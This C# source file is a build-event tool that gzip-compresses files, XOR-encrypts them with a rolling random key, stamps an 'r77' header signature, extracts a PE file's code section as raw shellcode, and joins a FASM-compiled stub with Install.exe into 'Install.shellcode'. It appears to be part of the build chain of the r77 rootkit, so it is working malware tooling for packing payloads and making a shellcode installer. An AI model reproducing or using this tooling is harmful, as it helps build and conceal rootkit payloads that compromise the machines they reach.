using BytecodeApi.Extensions;
using Global;
using System.Diagnostics;
using System.IO.Compression;
using System.Security.Cryptography;

// BuildTask.exe is used for VS build events.
// The first argument is a path to the file to be processed (except for -shellcodeinstaller)
//  -compress: Compress file
//  -encrypt: Encrypt file
//  -toshellcode: Extracts an executable file's .text section
//  -r77helper: Write R77_HELPER_SIGNATURE to r77 header
//  -shellcodeinstaller: Converts Install.exe to Install.shellcode

if (args.Length == 0)
{
	return 1;
}
else if (args[0] == "-shellcodeinstaller")
{
	if (!Directory.Exists(args[1])) return 1;

	return CreateShellCodeInstaller(args[1]) ? 0 : 1;
}
else
{
	if (!File.Exists(args[0])) return 1;

	byte[] file = File.ReadAllBytes(args[0]);
	if (args.Contains("-compress")) file = Compress(file);
	if (args.Contains("-encrypt")) file = Encrypt(file);
	if (args.Contains("-toshellcode")) file = ExtractShellCode(file);
	if (args.Contains("-r77helper")) file = R77Signature(file, R77Const.R77HelperSignature);

	File.WriteAllBytes(args[0], file);
	return 0;
}

static byte[] Compress(byte[] data)
{
	using MemoryStream memoryStream = new();
	using (GZipStream gzipStream = new(memoryStream, CompressionMode.Compress, true))
	{
		gzipStream.Write(data, 0, data.Length);
	}

	return memoryStream.ToArray();
}
static byte[] Encrypt(byte[] data)
{
	// A trivial encryption algorithm is sufficient and requires no .NET classes to be imported.

	byte[] keyBytes = RandomNumberGenerator.GetBytes(4);
	int key = BitConverter.ToInt32(keyBytes);

	byte[] encrypted = new byte[data.Length + 4];
	Buffer.BlockCopy(keyBytes, 0, encrypted, 0, 4);

	for (int i = 0; i < data.Length; i++)
	{
		encrypted[i + 4] = (byte)(data[i] ^ key);
		key = key << 1 | key >> (32 - 1);
	}

	return encrypted;
}
static byte[] R77Signature(byte[] file, ushort signature)
{
	// Write a 16-bit signature to the r77 header.
	byte[] newFile = file.ToArray();
	Buffer.BlockCopy(BitConverter.GetBytes(signature), 0, newFile, R77Const.R77HeaderOffset, 2);
	return newFile;
}
static bool CreateShellCodeInstaller(string solutionDir)
{
	Directory.CreateDirectory(Path.Combine(solutionDir, @"InstallShellcode\bin"));

	string shellCodeExePath = Path.Combine(solutionDir, @"InstallShellcode\bin\InstallShellcode.exe");
	string shellCodePath = Path.Combine(solutionDir, @"InstallShellcode\bin\InstallShellcode.shellcode");

	if (FasmCompile(Path.Combine(solutionDir, @"SlnBin\FASM"), Path.Combine(solutionDir, @"InstallShellcode\InstallShellcode.asm"), shellCodeExePath))
	{
		byte[] shellCode = ExtractShellCode(File.ReadAllBytes(shellCodeExePath));
		File.WriteAllBytes(shellCodePath, shellCode);

		// Install.shellcode is literally just shellcode + Install.exe
		using FileStream file = File.Create(Path.Combine(solutionDir, @"$Build\Install.shellcode"));
		file.Write(shellCode);
		file.Write(File.ReadAllBytes(Path.Combine(solutionDir, @"$Build\Install.exe")));

		return true;
	}
	else
	{
		return false;
	}
}
static bool FasmCompile(string fasmPath, string asmFileName, string outputFileName)
{
	// Compiles an .asm file using FASM.exe

	Environment.SetEnvironmentVariable("INCLUDE", Path.Combine(fasmPath, "INCLUDE"), EnvironmentVariableTarget.Process);

	using Process? process = Process.Start(new ProcessStartInfo
	{
		FileName = Path.Combine(fasmPath, "FASM.exe"),
		Arguments = $"\"{asmFileName}\" \"{outputFileName}\"",
		UseShellExecute = false,
		CreateNoWindow = true
	});

	process?.WaitForExit();
	return process?.ExitCode == 0;
}
static byte[] ExtractShellCode(byte[] file)
{
	// Extracts the contents of an executable file's .text section.
	// This executable should only contain a .text section, i.e. it should be shellcode.

	int ntHeaders = BitConverter.ToInt32(file, 0x3c);
	short numberOfSections = BitConverter.ToInt16(file, ntHeaders + 0x6);
	short sizeOfOptionalHeader = BitConverter.ToInt16(file, ntHeaders + 0x14);

	for (short j = 0; j < numberOfSections; j++)
	{
		byte[] section = file.GetBytes(ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, 0x28);
		uint characteristics = BitConverter.ToUInt32(section, 0x24);

		if ((characteristics & 0x60000020) == 0x60000020) // IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
		{
			int pointerToRawData = BitConverter.ToInt32(section, 0x14);
			int virtualSize = BitConverter.ToInt32(section, 0x8);

			return file.GetBytes(pointerToRawData, virtualSize);
		}
	}

	throw new FormatException("Could not find section with executable code.");
}